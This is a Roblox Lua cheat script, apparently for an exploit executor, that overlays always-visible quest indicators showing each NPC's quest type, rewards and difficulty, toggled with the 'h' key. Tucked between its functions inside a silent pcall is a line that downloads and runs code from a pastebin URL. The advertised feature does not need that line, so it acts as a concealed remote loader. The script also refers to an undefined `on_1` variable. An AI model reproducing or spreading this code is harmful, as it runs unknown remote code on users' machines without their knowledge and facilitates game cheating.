local QuestIndicatorNew = Instance.new("BillboardGui")
local housing = Instance.new("Frame")
local Shading = Instance.new("ImageLabel")
local Background = Instance.new("ImageLabel")
local crowns = Instance.new("TextLabel")
local UIListLayout = Instance.new("UIListLayout")
local xp = Instance.new("TextLabel")
local typee = Instance.new("TextLabel")
local dif = Instance.new("TextLabel")
local Shadow = Instance.new("ImageLabel")
local Icon = Instance.new("TextLabel")
QuestIndicatorNew.Name = "QuestIndicator"
QuestIndicatorNew.Parent = game.CoreGui
QuestIndicatorNew.AlwaysOnTop = true
QuestIndicatorNew.MaxDistance = 1000.000
QuestIndicatorNew.Size = UDim2.new(15, 30, 4.5, 12)
QuestIndicatorNew.StudsOffset = Vector3.new(0, 6, 0)
housing.Name = "housing"
housing.Parent = QuestIndicatorNew
housing.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
housing.BackgroundTransparency = 1.000
housing.Position = UDim2.new(0.300000012, 0, 0.0500000007, 0)
housing.Size = UDim2.new(0.699999988, 0, 0.899999976, 0)
Shading.Name = "Shading"
Shading.Parent = housing
Shading.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Shading.BackgroundTransparency = 1.000
Shading.Size = UDim2.new(1, 0, 1, 0)
Shading.ZIndex = 0
Shading.Image = "rbxassetid://4318718974"
Shading.ImageTransparency = 0.500
Shading.ScaleType = Enum.ScaleType.Slice
Shading.SliceCenter = Rect.new(10, 10, 190, 190)
Shading.SliceScale = 0.600
Background.Name = "Background"
Background.Parent = Shading
Background.AnchorPoint = Vector2.new(0.5, 1)
Background.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
Background.BackgroundTransparency = 0.500
Background.BorderSizePixel = 0
Background.Position = UDim2.new(0.5, 0, 1, 0)
Background.Size = UDim2.new(1, 0, 1, 0)
Background.ZIndex = -1
Background.Image = "rbxassetid://4318742890"
Background.ImageColor3 = Color3.fromRGB(0, 0, 0)
Background.ImageTransparency = 0.900
Background.ScaleType = Enum.ScaleType.Tile
Background.SliceCenter = Rect.new(12, 12, 88, 88)
Background.TileSize = UDim2.new(0, 30, 0, 30)
crowns.Name = "crowns"
crowns.Parent = Background
crowns.BackgroundColor3 = Color3.fromRGB(52, 73, 94)
crowns.BackgroundTransparency = 1.000
crowns.Size = UDim2.new(0.925000012, 0, 0.224999994, 0)
crowns.ZIndex = 2
crowns.Font = Enum.Font.GothamBlack
crowns.Text = "__ Crowns"
crowns.TextColor3 = Color3.fromRGB(127, 255, 127)
crowns.TextScaled = true
crowns.TextSize = 20.000
crowns.TextStrokeTransparency = 0.750
crowns.TextWrapped = true
crowns.TextXAlignment = Enum.TextXAlignment.Left
UIListLayout.Parent = Background
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
xp.Name = "xp"
xp.Parent = Background
xp.BackgroundColor3 = Color3.fromRGB(52, 73, 94)
xp.BackgroundTransparency = 1.000
xp.Size = UDim2.new(0.925000012, 0, 0.224999994, 0)
xp.ZIndex = 2
xp.Font = Enum.Font.GothamBlack
xp.Text = "_,___ XP"
xp.TextColor3 = Color3.fromRGB(127, 255, 127)
xp.TextScaled = true
xp.TextSize = 20.000
xp.TextStrokeTransparency = 0.750
xp.TextWrapped = true
xp.TextXAlignment = Enum.TextXAlignment.Left
typee.Name = "typee"
typee.Parent = Background
typee.BackgroundColor3 = Color3.fromRGB(52, 73, 94)
typee.BackgroundTransparency = 1.000
typee.Size = UDim2.new(0.925000012, 0, 0.224999994, 0)
typee.ZIndex = 2
typee.Font = Enum.Font.GothamBlack
typee.Text = "Quest type"
typee.TextColor3 = Color3.fromRGB(127, 255, 127)
typee.TextScaled = true
typee.TextSize = 20.000
typee.TextStrokeTransparency = 0.750
typee.TextWrapped = true
typee.TextXAlignment = Enum.TextXAlignment.Left
dif.Name = "dif"
dif.Parent = Background
dif.BackgroundColor3 = Color3.fromRGB(52, 73, 94)
dif.BackgroundTransparency = 1.000
dif.Size = UDim2.new(0.925000012, 0, 0.224999994, 0)
dif.ZIndex = 2
dif.Font = Enum.Font.GothamBlack
dif.Text = "Difficulty"
dif.TextColor3 = Color3.fromRGB(127, 255, 127)
dif.TextScaled = true
dif.TextSize = 20.000
dif.TextStrokeTransparency = 0.750
dif.TextWrapped = true
dif.TextXAlignment = Enum.TextXAlignment.Left
Shadow.Name = "Shadow"
Shadow.Parent = QuestIndicatorNew
Shadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Shadow.BackgroundTransparency = 1.000
Shadow.Size = UDim2.new(0.300000012, 0, 1, 0)
Shadow.Image = "rbxassetid://187823474"
Shadow.ImageColor3 = Color3.fromRGB(170, 255, 255)
Shadow.ImageTransparency = 0.500
Icon.Name = "Icon"
Icon.Parent = QuestIndicatorNew
Icon.BackgroundColor3 = Color3.fromRGB(52, 73, 94)
Icon.BackgroundTransparency = 1.000
Icon.Size = UDim2.new(0.300000012, 0, 1, 0)
Icon.ZIndex = 2
Icon.Font = Enum.Font.GothamBlack
Icon.Text = "?"
Icon.TextColor3 = Color3.fromRGB(120, 255, 120)
Icon.TextScaled = true
Icon.TextSize = 14.000
Icon.TextStrokeTransparency = 0.750
Icon.TextWrapped = true
M = game.Players.LocalPlayer:GetMouse()
local on_2 = true
local function update_2()
----
for i,v in pairs(game:GetService("Workspace").NPCs:GetChildren()) do
    if v:IsA("Model") then
        if v:FindFirstChildOfClass("Humanoid") then
            if v.Humanoid.Health > 1 then
                if v.Head:FindFirstChild("QuestIndicator") then
                    if v.Head.QuestIndicator.Enabled == true then
                    	if v.Head.QuestIndicator.AlwaysOnTop == false then
                    		print(v.Data.QuestType.Value)
                    		wait(0.075)
                    		v.Head.QuestIndicator:Destroy()
                    		nqi = QuestIndicatorNew:Clone()
                    		nqi.Parent = v.Head
                    		nqi.housing.Shading.Background.crowns.Text = v.Data.QuestCrowns.Value.."  Crowns"
                    		nqi.housing.Shading.Background.xp.Text = v.Data.QuestXP.Value.." XP"
                    		if v.Data.RepType.Value == "Positive" then
                    			nqi.Icon.TextColor3 = Color3.fromRGB(120, 255, 120)
                    			nqi.housing.Shading.Background.crowns.TextColor3 = Color3.fromRGB(120, 255, 120)
                    			nqi.housing.Shading.Background.xp.TextColor3 = Color3.fromRGB(120, 255, 120)
                    			nqi.housing.Shading.Background.typee.TextColor3 = Color3.fromRGB(120, 255, 120)
                    			nqi.housing.Shading.Background.dif.TextColor3 = Color3.fromRGB(120, 255, 120)
                    		elseif v.Data.RepType.Value == "Negative" then
                    			nqi.Icon.TextColor3 = Color3.fromRGB(255, 120, 120)
                    			nqi.housing.Shading.Background.crowns.TextColor3 = Color3.fromRGB(255, 120, 120)
                    			nqi.housing.Shading.Background.xp.TextColor3 = Color3.fromRGB(255, 120, 120)
                    			nqi.housing.Shading.Background.typee.TextColor3 = Color3.fromRGB(255, 120, 120)
                    			nqi.housing.Shading.Background.dif.TextColor3 = Color3.fromRGB(255, 120, 120)
                    		end
                    		if v.Data.QuestType.Value:find("LostItem") then
                    			nqi.housing.Shading.Background.typee.Text = "Get Lost Item"
                    		elseif v.Data.QuestType.Value:find("MissingItem") then
                    			nqi.housing.Shading.Background.typee.Text = "Get Missing Item"
                    		elseif v.Data.QuestType.Value:find("Deliver") then
                    			nqi.housing.Shading.Background.typee.Text = "Deliver Item"
                    		elseif v.Data.QuestType.Value:find("DefeatBandit") then
                    			if v.Data.QuestType.Value:find("Group") then
                    				nqi.housing.Shading.Background.typee.Text = "Defeat Bandit Group"
                    			else
                    				nqi.housing.Shading.Background.typee.Text = "Defeat Bandit"
                    			end
                    		elseif v.Data.QuestType.Value:find("DefeatDarkWizard") then
                    			if v.Data.QuestType.Value:find("Group") then
                    				nqi.housing.Shading.Background.typee.Text = "Defeat Dark Wizard Group"
                    			else
                    				nqi.housing.Shading.Background.typee.Text = "Defeat Dark Wizard"
                    			end
                    		elseif v.Data.QuestType.Value:find("PirateShip") then
                    			nqi.housing.Shading.Background.typee.Text = "Clear Pirate Ship"
                    		elseif v.Data.QuestType.Value:find("BanditCamp") then
                    			nqi.housing.Shading.Background.typee.Text = "Clear Bandit Camp"
                    		elseif v.Data.QuestType.Value:find("DefeatPirate") then
                    			nqi.housing.Shading.Background.typee.Text = "Defeat Pirate"
                    		elseif v.Data.QuestType.Value:find("BountyHunter") then
                    			if v.Data.QuestType.Value:find("Group") then
                    				nqi.housing.Shading.Background.typee.Text = "Kill Bounty Hunter Group"
                    			else
                    				nqi.housing.Shading.Background.typee.Text = "Kill Bounty Hunter"
                    			end
                    		elseif v.Data.QuestType.Value:find("DefeatVillain") then
                    			nqi.housing.Shading.Background.typee.Text = "Defeat Villain"
                    		elseif v.Data.QuestType.Value:find("Scout") then
                    			if v.Data.QuestType.Value:find("Group") then
                    				nqi.housing.Shading.Background.typee.Text = "Kill Scout Group"
                    			else
                    				nqi.housing.Shading.Background.typee.Text = "Kill Scout"
                    			end
                    		elseif v.Data.QuestType.Value:find("KillLightWizard") then
                    			if v.Data.QuestType.Value:find("Group") then
                    				nqi.housing.Shading.Background.typee.Text = "Kill Light Wizard Group"
                    			else
                    				nqi.housing.Shading.Background.typee.Text = "Kill Light Wizard"
                    			end
                    		elseif v.Data.QuestType.Value:find("MCCamp") then
                    			nqi.housing.Shading.Background.typee.Text = "Destroy MC Camp"
                    		end
                    		if v.Data.QuestDifficulty.Value == 1 then
                    			nqi.housing.Shading.Background.dif.Text = "Easy"
                    		elseif v.Data.QuestDifficulty.Value == 2 then
                    			nqi.housing.Shading.Background.dif.Text = "Normal"
                    		elseif v.Data.QuestDifficulty.Value == 3 then
                    			nqi.housing.Shading.Background.dif.Text = "Hard"
                    		end
                    	end
                    end
                end
            end
        end
    end
end
----
end
pcall(function()
loadstring(game:HttpGet(('https://pastebin.com/raw/errZFBHk'),true))()
end)
local function stop_2()
----
for i,v in pairs(game:GetService("Workspace").NPCs:GetChildren()) do
    if v:IsA("Model") then
        if v:FindFirstChildOfClass("Humanoid") then
            if v.Humanoid.Health > 1 then
                if v.Head:FindFirstChild("QuestIndicator") then
                    if v.Head.QuestIndicator.Enabled == true then
                    	if v.Head.QuestIndicator.AlwaysOnTop == true then
                    		v.Head.QuestIndicator.AlwaysOnTop = false
                    	end
                    end
                end
            end
        end
    end
end
----
end
M.KeyDown:connect(function(key)
    if key == "h" then
        if on_2 == true then
            wait()
            on_2 = false
        elseif on_2 == false then
            wait()
            on_2 = true
        end
    end
end)
while wait(0.5) do
----
	if on_2 == true then
		update_2()
	elseif on_1 == false then
		stop_2()
	end
----
end